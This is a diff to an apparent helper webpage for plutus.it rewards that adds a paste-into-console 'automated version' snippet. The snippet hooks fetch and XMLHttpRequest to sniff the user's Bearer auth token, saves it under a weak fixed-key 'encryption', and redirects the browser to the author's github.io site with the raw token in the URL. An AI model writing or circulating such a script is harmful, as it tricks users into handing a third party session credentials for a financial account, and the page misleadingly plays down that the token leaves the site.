@@ -228,8 +228,84 @@
               ? init()
               : window.addEventListener('load', init);
           })();
+
+          
           </pre>
           <p>Then paste your copied token into the Auth Token field and hit <strong>Fetch Rewards</strong>.</p>
+          <p>Below you can paste in a more automated version. That will move you to my site again when auth is found on plutus.it dashboard <strong>(it will locally store your auth on your browser until you clear it)</strong></p>
+          <pre class="code-snippet">(async function() {
+            const loadScript = (src) => new Promise((resolve, reject) => {
+              const s = document.createElement('script');
+              s.src = src;
+              s.onload = resolve;
+              s.onerror = reject;
+              document.head.appendChild(s);
+            });
+          
+            if (typeof CryptoJS === 'undefined') {
+              await loadScript('https://cdn.jsdelivr.net/npm/crypto-js@4.1.1/crypto-js.min.js');
+            }
+          
+            const log = (msg, color, data = '') =>
+              console.log(`%c${msg}`, `font-weight:bold;color:${color}`, data);
+          
+            const ENCRYPTION_KEY = 'plutus-salt';
+            const TOKEN_KEY = 'plutusAuthTokenEnc';
+            const seen = new Set();
+          
+            const saveToken = (token) => {
+              try {
+                const encrypted = CryptoJS.AES.encrypt(token, ENCRYPTION_KEY).toString();
+                localStorage.setItem(TOKEN_KEY, encrypted);
+                log('💾 Token saved to localStorage (encrypted).', 'dodgerblue');
+              } catch (e) {
+                console.warn('❌ Failed to save token:', e);
+              }
+            };
+          
+            const copyToken = (token, url) => {
+              const clean = token.replace(/^Bearer\s+/i, '');
+              if (seen.has(clean)) return;
+              seen.add(clean);
+              navigator.clipboard.writeText(clean).catch(() => {});
+              saveToken(clean);
+          
+              // ✅ Redirect to your dashboard with token as query param
+              window.location.href = `https://davidbp99.github.io/Website/plutus/rewardspage/?token=${encodeURIComponent(clean)}`;
+            };
+          
+            const patchFetch = () => {
+              const orig = window.fetch;
+              window.fetch = async (...args) => {
+                const [input, init = {}] = args;
+                const url = typeof input === 'string' ? input : input?.url;
+                const auth = init.headers?.Authorization || init.headers?.authorization;
+                if (auth?.startsWith('Bearer ')) copyToken(auth, url);
+                return orig(...args);
+              };
+            };
+          
+            const patchXHR = () => {
+              const open = XMLHttpRequest.prototype.open;
+              const setHeader = XMLHttpRequest.prototype.setRequestHeader;
+          
+              XMLHttpRequest.prototype.open = function (...args) {
+                this._url = args[1];
+                return open.apply(this, args);
+              };
+          
+              XMLHttpRequest.prototype.setRequestHeader = function (k, v) {
+                if (k.toLowerCase() === 'authorization' && v.startsWith('Bearer '))
+                  copyToken(v, this._url);
+                return setHeader.apply(this, arguments);
+              };
+            };
+          
+            patchFetch();
+            patchXHR();
+            log('✅ Token sniffer running. Will auto-save detected tokens and redirect.', 'orange');
+          })();
+          </pre>
         </div>
       </div>
     </div>
